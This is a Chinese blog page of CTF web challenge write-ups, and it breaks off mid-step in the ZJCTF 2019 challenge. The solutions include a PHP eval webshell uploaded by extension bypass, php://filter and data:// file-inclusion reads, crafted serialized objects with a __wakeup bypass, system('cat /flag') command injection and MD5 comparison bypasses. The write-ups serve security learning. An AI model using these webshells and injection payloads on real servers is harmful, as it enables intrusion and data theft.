<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131549751.png" alt="image-20230113154934695"></p>
<p>账号：admin</p>
<p>密码：admin888</p>
<p>登陆成功，之后便是一堆文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131550875.png" alt="image-20230113155032742"></p>
<p>在一通尝试后，发现有一个可疑的phpinfo.php，下载后在phpstrom中打开并运行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131552182.png" alt="image-20230113155243035"></p>
<p>但这个访问的是本地的，需要改成远程，即把URL中的localhost改成题目的IP或端口，即</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://1.14.71.254:28791//phpinfo.php" >http://1.14.71.254:28791//phpinfo.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>回车后查找flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131556083.png" alt="image-20230113155649987"></p>

        <h1 id="五、-SWPUCTF-2021-新生赛-easy-md5"   >
          <a href="#五、-SWPUCTF-2021-新生赛-easy-md5" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、-SWPUCTF-2021-新生赛-easy-md5" class="headerlink" title="五、[SWPUCTF 2021 新生赛]easy_md5"></a>五、[SWPUCTF 2021 新生赛]easy_md5</h1>
      <p>打开后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301111241802.png" alt="image-20230111124106656"></p>
<p>首先是需要GET变量name和POST变量password，这一点类似于第一题，可以明确使用HackBar</p>
<p>接着往下阅读：要想获得flag，name和password的值不能相同但是它们的MD5值要相同</p>
<p>此处MD5是双等号，即是弱类型比较</p>

        <h6 id="MD5绕过有两种方法：数组绕过和科学计数法绕过"   >
          <a href="#MD5绕过有两种方法：数组绕过和科学计数法绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#MD5绕过有两种方法：数组绕过和科学计数法绕过" class="headerlink" title="MD5绕过有两种方法：数组绕过和科学计数法绕过"></a>MD5绕过有两种方法：数组绕过和科学计数法绕过</h6>
      
        <h3 id="法Ⅰ：数组绕过"   >
          <a href="#法Ⅰ：数组绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅰ：数组绕过" class="headerlink" title="法Ⅰ：数组绕过"></a>法Ⅰ：数组绕过</h3>
      <p>由于MD5不能加密数组，在加密数组的时候会返回NULL，所以我们可以让这两个变量是不同的数组，这样MD5值就相同了（即都为NULL）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131606087.png" alt="image-20230113160607015"></p>
<p>EXECUTE后得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131606124.png" alt="image-20230113160631065"></p>

        <h3 id="法Ⅱ：科学计数法绕过"   >
          <a href="#法Ⅱ：科学计数法绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：科学计数法绕过" class="headerlink" title="法Ⅱ：科学计数法绕过"></a>法Ⅱ：科学计数法绕过</h3>
      <p>给这两个变量定义成MD5加密后是0e开头的字符串（这个可以从网上找），如图</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131610867.png" alt="image-20230113161054812"></p>
<p>EXECUTE后同样得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131611223.png" alt="image-20230113161117164"></p>

        <h6 id="附：MD5绕过"   >
          <a href="#附：MD5绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#附：MD5绕过" class="headerlink" title="附：MD5绕过"></a>附：MD5绕过</h6>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/116779357" >https://blog.csdn.net/LYJ20010728/article/details/116779357</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="六、-SWPUCTF-2021-新生赛-include"   >
          <a href="#六、-SWPUCTF-2021-新生赛-include" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、-SWPUCTF-2021-新生赛-include" class="headerlink" title="六、[SWPUCTF 2021 新生赛]include"></a>六、[SWPUCTF 2021 新生赛]include</h1>
      <p>打开环境后要求上传一个文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141346762.png" alt="image-20230114134608687"></p>
<p>那就随便上传一个文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141346152.png" alt="image-20230114134633094"></p>
<p>它说flag在flag.php中，那尝试一下传入flag.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141348351.png" alt="image-20230114134837268"></p>
<p>看来不行</p>
<p>一般有include或是include_once可以想到用php的伪协议</p>
<p><code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<p>读取源代码并进行base64编码输出</p>
<p>于是便得到一串base64编码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141353992.png" alt="image-20230114135326851"></p>
<p>用Cyberchef进行解码得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141354123.png" alt="image-20230114135414070"></p>

        <h6 id="附：常用php伪协议-celtyl"   >
          <a href="#附：常用php伪协议-celtyl" class="heading-link"><i class="fas fa-link"></i></a><a href="#附：常用php伪协议-celtyl" class="headerlink" title="附：常用php伪协议 celtyl"></a>附：常用php伪协议 celtyl</h6>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12285202.html" >https://www.cnblogs.com/wjrblogs/p/12285202.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="七、-SWPUCTF-2021-新生赛-PseudoProtocols"   >
          <a href="#七、-SWPUCTF-2021-新生赛-PseudoProtocols" class="heading-link"><i class="fas fa-link"></i></a><a href="#七、-SWPUCTF-2021-新生赛-PseudoProtocols" class="headerlink" title="七、[SWPUCTF 2021 新生赛]PseudoProtocols"></a>七、[SWPUCTF 2021 新生赛]PseudoProtocols</h1>
      <p>打开后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141421711.png" alt="image-20230114142111659"></p>
<p>它想让我们找hint.php文件，而且注意到此时URL上已经传入了参数wllm，可以使用伪协议读取这个hint.php文件</p>
<p>在后面输入</p>
<p><code>php://filter/read=convert.base64-encode/resource=hint.php</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141424733.png" alt="image-20230114142428678"></p>
<p>解码后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141425949.png" alt="image-20230114142506902"></p>
<p>提示我们去这个/test，于是重新输入/test2222222222222.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141426075.png" alt="image-20230114142627016"></p>
<p>阅读代码后发现是需要传入参数a，a要求传入文件，并且文件内容为：I want flag</p>
<p>利用data://协议:</p>
<p>先将I want flag变成base64编码格式，即SSB3YW50IGZsYWc=</p>
<p>接着输入</p>
<p><code>?a=data://text/plain;base64,SSB3YW50IGZsYWc=</code></p>
<p>回车后得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141433590.png" alt="image-20230114143315508"></p>
<p>（PS：也可以直接输入<code>?a=data://text/plain,I want flag</code>，即不将I want flag变成base64编码格式）</p>

        <h1 id="八、-NISACTF-2022-easyssrf"   >
          <a href="#八、-NISACTF-2022-easyssrf" class="heading-link"><i class="fas fa-link"></i></a><a href="#八、-NISACTF-2022-easyssrf" class="headerlink" title="八、[NISACTF 2022]easyssrf"></a>八、[NISACTF 2022]easyssrf</h1>
      <p>打开后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141524463.png" alt="image-20230114152400330"></p>
<p>随便输个网址尝试一下</p>
<p><code>http://www.bilibili.com</code></p>
<p>结果返回</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141525596.png" alt="image-20230114152501550"></p>
<p>看来不对，再试试直接输入flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141525920.png" alt="image-20230114152543873"></p>
<p>那就看看提示文件，输入file:///fl4g（因为说了提示文件是/fl4g，所以有三个/）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141526545.png" alt="image-20230114152647479"></p>
<p>访问这个<code>/ha1x1ux1u.php</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141527156.png" alt="image-20230114152723108"></p>
<p>阅读代码后可知，需要传入file，而且flag在/flag里</p>
<p>尝试伪协议</p>
<p><code>?file=php://filter/read=convert.base64-encode/resource=/flag</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141531800.png" alt="image-20230114153124729"></p>
<p>解码后获得flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141531378.png" alt="image-20230114153154328"></p>

        <h1 id="九、-SWPUCTF-2021-新生赛-ez-unserialize"   >
          <a href="#九、-SWPUCTF-2021-新生赛-ez-unserialize" class="heading-link"><i class="fas fa-link"></i></a><a href="#九、-SWPUCTF-2021-新生赛-ez-unserialize" class="headerlink" title="九、[SWPUCTF 2021 新生赛]ez_unserialize"></a>九、[SWPUCTF 2021 新生赛]ez_unserialize</h1>
      <p>打开环境后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161247333.png" alt="image-20230116124720192"></p>
<p>没有看见题目，查看网页源代码和用burpsuite都没有发现，用dirsearch工具扫描一下</p>

        <h6 id="工具使用方法："   >
          <a href="#工具使用方法：" class="heading-link"><i class="fas fa-link"></i></a><a href="#工具使用方法：" class="headerlink" title="工具使用方法："></a>工具使用方法：</h6>
      
        <h6 id="在该界面右键进入终端"   >
          <a href="#在该界面右键进入终端" class="heading-link"><i class="fas fa-link"></i></a><a href="#在该界面右键进入终端" class="headerlink" title="在该界面右键进入终端"></a>在该界面右键进入终端</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161256656.png" alt="image-20230116125634575"></p>

        <h6 id="再输入"   >
          <a href="#再输入" class="heading-link"><i class="fas fa-link"></i></a><a href="#再输入" class="headerlink" title="再输入"></a>再输入</h6>
      
        <h6 id="python-dirsearch-py-u-当前的URL"   >
          <a href="#python-dirsearch-py-u-当前的URL" class="heading-link"><i class="fas fa-link"></i></a><a href="#python-dirsearch-py-u-当前的URL" class="headerlink" title="python .\dirsearch.py -u +当前的URL"></a><code>python .\dirsearch.py -u +当前的URL</code></h6>
      <p>在本题则是输入</p>
<p><code>python .\dirsearch.py -u http://1.14.71.254:28197/</code></p>
<p>回车后即开始扫描</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161259909.png" alt="image-20230116125921816"></p>
<p>数字表示HTTP的状态码</p>
<p>可以看到有两个状态码都是200的，即可以访问的，尝试后发现只有/robots.txt可以访问</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161303862.png" alt="image-20230116130354814"></p>
<p>提示我们访问/cl45s.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161305488.png" alt="image-20230116130525410"></p>
<p>阅读代码后发现，要想获得flag，那么参数admin就需要等于admin，参数passwd需要等于ctf，但一开始是将参数admin定义为user，参数passwd定义为123456的，所以我们就需要修改这两个参数的值，也可以得知这个与序列化有关，因此应该传入反序列化后满足条件的参数p</p>
<p>把这段代码复制到Phpstorm查看wllm类的序列化，稍加修改，注意添上echo serialize</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;cl45s.php&quot;);</span><br><span class="line"></span><br><span class="line">class wllm&#123;</span><br><span class="line"></span><br><span class="line">    public $admin;</span><br><span class="line">    public $passwd;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">        $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123;</span><br><span class="line">            include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &quot;Just a bit more!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$p = new wllm();</span><br><span class="line">echo serialize($p);</span><br><span class="line">//$p = $_GET[&#x27;p&#x27;];</span><br><span class="line">//unserialize($p);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>运行后得到类wllm的序列化</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161501367.png" alt="image-20230116150108299"></p>
<p>即O:4:”wllm”:2:{s:5:”admin”;s:4:”user”;s:6:”passwd”;s:6:”123456”;}</p>
<p>于是将两个参数的值修改，即在url上输入</p>
<p><code>?p=O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125;</code></p>
<p>回车后得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161344813.png" alt="image-20230116134408722"></p>

        <h6 id="附：CTF中的序列化与反序列化"   >
          <a href="#附：CTF中的序列化与反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#附：CTF中的序列化与反序列化" class="headerlink" title="附：CTF中的序列化与反序列化"></a>附：CTF中的序列化与反序列化</h6>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.manongjc.com/detail/17-iffyxbsaebsmupt.html" >http://www.manongjc.com/detail/17-iffyxbsaebsmupt.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="十、-SWPUCTF-2021-新生赛-no-wakeup"   >
          <a href="#十、-SWPUCTF-2021-新生赛-no-wakeup" class="heading-link"><i class="fas fa-link"></i></a><a href="#十、-SWPUCTF-2021-新生赛-no-wakeup" class="headerlink" title="十、[SWPUCTF 2021 新生赛]no_wakeup"></a>十、[SWPUCTF 2021 新生赛]no_wakeup</h1>
      <p>打开环境后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309061554316.png" alt="image-20230906155442200"></p>
<p>点金连接后，也是一串代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161333824.png" alt="image-20230116133351743"></p>
<p>与上一题类似，反序列化，但是本题多了wakeup函数，由于在反序列化执行之前，会先执行__wakeup函数，所以需要绕过</p>
<p>绕过_wakeup函数的方法：<em>当成员属性数目大于实际数目时可绕过wakeup方法</em></p>
<p>所以需要把成员数目的2变成大于2的数字，例如4，即输入</p>
<p><code>?p=O:6:&quot;HaHaHa&quot;:4:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;</code></p>
<p>回车得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161338946.png" alt="image-20230116133842852"></p>

        <h1 id="十一、-HCTF-2018-Warmup"   >
          <a href="#十一、-HCTF-2018-Warmup" class="heading-link"><i class="fas fa-link"></i></a><a href="#十一、-HCTF-2018-Warmup" class="headerlink" title="十一、[HCTF 2018]Warmup"></a>十一、[HCTF 2018]Warmup</h1>
      <p>见”BUU-1.md”</p>

        <h1 id="十五、-SWPUCTF-2021-新生赛-easyupload1-0"   >
          <a href="#十五、-SWPUCTF-2021-新生赛-easyupload1-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#十五、-SWPUCTF-2021-新生赛-easyupload1-0" class="headerlink" title="十五、[SWPUCTF 2021 新生赛]easyupload1.0"></a>十五、[SWPUCTF 2021 新生赛]easyupload1.0</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151651849.png" alt="image-20240115165127781"></p>
<p>上传一个写有一句话木马的php格式的文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151652289.png" alt="image-20240115165250245"></p>
<p>被过滤了，上传写有一句话木马jpg格式的文件</p>
<p><code>GIF89a</code></p>
<script language='php'>@eval($_POST[shell]);</script>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151654815.png" alt="image-20240115165435741"></p>
<p>上传成功</p>
<p>抓包修改文件类型为php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151657048.png" alt="image-20240115165705981"></p>
<p>发送后，用蚁剑连接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151657098.png" alt="image-20240115165739952"></p>
<p>添加数据后在文件列表里找到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151659646.png" alt="image-20240115165912580"></p>
<p>尝试提交发现是假的，，，</p>

        <h1 id="十六、-SWPUCTF-2021-新生赛-easyupload2-0"   >
          <a href="#十六、-SWPUCTF-2021-新生赛-easyupload2-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#十六、-SWPUCTF-2021-新生赛-easyupload2-0" class="headerlink" title="十六、[SWPUCTF 2021 新生赛]easyupload2.0"></a>十六、[SWPUCTF 2021 新生赛]easyupload2.0</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281112129.png" alt="image-20240528111251083"></p>
<p>文件上传题，上传一个写有一句话木马的php文件后提示不行，那上传一个jpg格式的</p>
<p>上传成功，抓一下包改后缀为php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281124594.png" alt="image-20240528112411553"></p>
<p>还是被它识别出来了</p>

        <h6 id="绕过后缀的有文件格式有php-php3-php4-php5-phtml-pht"   >
          <a href="#绕过后缀的有文件格式有php-php3-php4-php5-phtml-pht" class="heading-link"><i class="fas fa-link"></i></a><a href="#绕过后缀的有文件格式有php-php3-php4-php5-phtml-pht" class="headerlink" title="绕过后缀的有文件格式有php,php3,php4,php5,phtml,pht"></a>绕过后缀的有文件格式有php,php3,php4,php5,phtml,pht</h6>
      <p>所以把后缀改成phtml试试，上传成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281318724.png" alt="image-20240528131855656"></p>
<p>蚁剑连接 （注意URL这里还有一个./）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281321345.png" alt="image-20240528132159271"></p>
<p>添加数据后打开文件管理，找到flag.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281324123.png" alt="image-20240528132410073"></p>

        <h1 id="十七、-GXYCTF2019-BabyUpload-1"   >
          <a href="#十七、-GXYCTF2019-BabyUpload-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十七、-GXYCTF2019-BabyUpload-1" class="headerlink" title="十七、[GXYCTF2019]BabyUpload 1"></a>十七、[GXYCTF2019]BabyUpload 1</h1>
      <p>见“BUU-1.md”</p>

        <h1 id="十八、-SWPUCTF-2021-新生赛-caidao"   >
          <a href="#十八、-SWPUCTF-2021-新生赛-caidao" class="heading-link"><i class="fas fa-link"></i></a><a href="#十八、-SWPUCTF-2021-新生赛-caidao" class="headerlink" title="十八、[SWPUCTF 2021 新生赛]caidao"></a>十八、[SWPUCTF 2021 新生赛]caidao</h1>
      <p>打开环境后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161536904.png" alt="image-20230116153620739"></p>
<p>是一句话木马，便可以用蚁剑</p>
<p>添加数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161537841.png" alt="image-20230116153737772"></p>
<p>双击查看文件</p>
<p>在根目录下找到/flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161538298.png" alt="image-20230116153841184"></p>
<p>打开后得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161538981.png" alt="image-20230116153858927"></p>
<p>该题类似于[极客大挑战 2019]Knife 1</p>

        <h1 id="十九、-SWPUCTF-2021-新生赛-easyrce"   >
          <a href="#十九、-SWPUCTF-2021-新生赛-easyrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#十九、-SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="十九、[SWPUCTF 2021 新生赛]easyrce"></a>十九、[SWPUCTF 2021 新生赛]easyrce</h1>
      <p>打开后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309061640144.png" alt="image-20230906164009106"></p>
<p>题目已经提示了这是RCE题目，而且使用GET方法</p>
<p>使用命令执行函数system()</p>
<p>输入</p>
<p><code>/?url=system(&quot;ls&quot;);</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309061645013.png" alt="image-20230906164502980"></p>
<p>再打开根目录，输入</p>
<p><code>/?url=system(&quot;ls /&quot;)；</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309061645758.png" alt="image-20230906164547722"></p>
<p>发现有一个文件flllllaaaaaaggggggg，使用cat命令打开看看</p>
<p>即输入<code>/?url=system(&quot;cat /flllllaaaaaaggggggg&quot;)；</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309061648745.png" alt="image-20230906164823704"></p>
<p>得到flag</p>

        <h1 id="二十、-SWPUCTF-2021-新生赛-easyupload3-0"   >
          <a href="#二十、-SWPUCTF-2021-新生赛-easyupload3-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十、-SWPUCTF-2021-新生赛-easyupload3-0" class="headerlink" title="二十、[SWPUCTF 2021 新生赛]easyupload3.0"></a>二十、[SWPUCTF 2021 新生赛]easyupload3.0</h1>
      <p>同[GXYCTF2019]BabyUpload 1</p>
<p>依然是配置文件再上传一句话木马，最后flag在/var/www/html目录里</p>

        <h1 id="二十一、-SWPUCTF-2021-新生赛-babyrce"   >
          <a href="#二十一、-SWPUCTF-2021-新生赛-babyrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十一、-SWPUCTF-2021-新生赛-babyrce" class="headerlink" title="二十一、[SWPUCTF 2021 新生赛]babyrce"></a>二十一、[SWPUCTF 2021 新生赛]babyrce</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111432130.png" alt="image-20240111143209010"></p>
<p>阅读代码可知，修改Cookie的值为 admin=1</p>
<p>使用HackBar修改</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111433470.png" alt="image-20240111143313395"></p>
<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111433079.png" alt="image-20240111143329029"></p>
<p>提示有一个rasalghul.php，访问一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111434453.png" alt="image-20240111143404380"></p>
<p>阅读代码可知，通过GET方法传入参数url，但过滤了空格，同时使用 <code>shell_exec</code> 函数执行 <code>$ip</code> 变量中的命令</p>
<p>查看根目录下的文件和目录（别忘记绕过空格，此处用%09绕过）</p>
<p><code>?url=ls%09/;</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111442737.png" alt="image-20240111144229660"></p>
<p>打开/flllllaaaaaaggggggg文件</p>
<p><code>?url=cat%09/flllllaaaaaaggggggg;</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111443632.png" alt="image-20240111144342560"></p>
<p>获得flag</p>

        <h1 id="二十二、-LitCTF-2023-我Flag呢？"   >
          <a href="#二十二、-LitCTF-2023-我Flag呢？" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十二、-LitCTF-2023-我Flag呢？" class="headerlink" title="二十二、[LitCTF 2023]我Flag呢？"></a>二十二、[LitCTF 2023]我Flag呢？</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111448541.png" alt="image-20240111144816063"></p>
<p>直接查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111448288.png" alt="image-20240111144844220"></p>
<p>得到flag</p>

        <h1 id="二十三、-LitCTF-2023-PHP是世界上最好的语言！！"   >
          <a href="#二十三、-LitCTF-2023-PHP是世界上最好的语言！！" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十三、-LitCTF-2023-PHP是世界上最好的语言！！" class="headerlink" title="二十三、[LitCTF 2023]PHP是世界上最好的语言！！"></a>二十三、[LitCTF 2023]PHP是世界上最好的语言！！</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111509396.png" alt="image-20240111150904300"></p>
<p>有一个RUN CODE按钮，试着输入一些命令运行</p>
<p>查看根目录下的文件，输入命令</p>
<p><code>system(&quot;ls /&quot;);</code></p>
<p>点击RUN CODE</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111506640.png" alt="image-20240111150659574"></p>
<p>打开flag文件</p>
<p><code>system(&quot;cat /flag&quot;);</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111508663.png" alt="image-20240111150824586"></p>
<p>获得flag</p>

        <h1 id="二十四、-ZJCTF-2019-NiZhuanSiWei"   >
          <a href="#二十四、-ZJCTF-2019-NiZhuanSiWei" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十四、-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="二十四、[ZJCTF 2019]NiZhuanSiWei"></a>二十四、[ZJCTF 2019]NiZhuanSiWei</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111625835.png" alt="image-20240111162515769"></p>
<p>阅读代码可知，用GET方法传入参数text，file和password</p>
<p>首先<code>$text</code> 所指向的文件内容要为字符串 “welcome to the zjctf”，变量 <code>$file</code> 中的字符串不能包含 “flag”，接着执行<code>$file</code> 变量指向的文件，后面有提示是useless.php，再反序列化 <code>$password</code> 变量的内容</p>
<p>利用data协议绕过file_get_contents，将welcome to the zjctf用base64编码格式输出为d2VsY29tZSB0byB0aGUgempjdGY=</p>
<p><code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111544052.png"></p>
<p>完成第一步，接下来执行<code>$file</code> 变量指向的文件，依然是利用伪协议</p>
<p><code>file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
<p>连起来payload为</p>
<p><code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111548387.png"></p>
<p>用CyberChef解码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111550040.png" alt="image-20240111155018918"></p>
<p>定义了一个Flag类，并在里面定义了属性<code>$file</code>，根据注释可以得知包含flag.php这个文件即可获得flag,即将Flag对象中的<code>$file</code>参数应为<code>flag.php</code></p>
<p>再根据<code>$password = unserialize($password);</code></p>

        <h6 id="若将一个序列化后的对象即一串字符串传给-password，那么我们会得到一个实例对象，若是我们将一个useless-php中的Flag对象-其中-file参数的值为flag-php-序列化后得到的字符串传给-password参数，经过反序列化后变变成了一个实例对象，一句可执行的代码-且能输出flag-php中的代码"   >
          <a href="#若将一个序列化后的对象即一串字符串传给-password，那么我们会得到一个实例对象，若是我们将一个useless-php中的Flag对象-其中-file参数的值为flag-php-序列化后得到的字符串传给-password参数，经过反序列化后变变成了一个实例对象，一句可执行的代码-且能输出flag-php中的代码" class="heading-link"><i class="fas fa-link"></i></a><a href="#若将一个序列化后的对象即一串字符串传给-password，那么我们会得到一个实例对象，若是我们将一个useless-php中的Flag对象-其中-file参数的值为flag-php-序列化后得到的字符串传给-password参数，经过反序列化后变变成了一个实例对象，一句可执行的代码-且能输出flag-php中的代码" class="headerlink" title="若将一个序列化后的对象即一串字符串传给$password，那么我们会得到一个实例对象，若是我们将一个useless.php中的Flag对象(其中$file参数的值为flag.php)序列化后得到的字符串传给$password参数，经过反序列化后变变成了一个实例对象，一句可执行的代码,且能输出flag.php中的代码"></a><em>若将一个序列化后的对象即一串字符串传给<code>$password</code>，那么我们会得到一个实例对象，若是我们将一个<code>useless.php</code>中的Flag对象(其中<code>$file</code>参数的值为<code>flag.php</code>)序列化后得到的字符串传给$password参数，经过反序列化后变变成了一个实例对象，一句可执行的代码,且能输出<code>flag.php</code>中的代码</em></h6>
      <p>构造：</p>
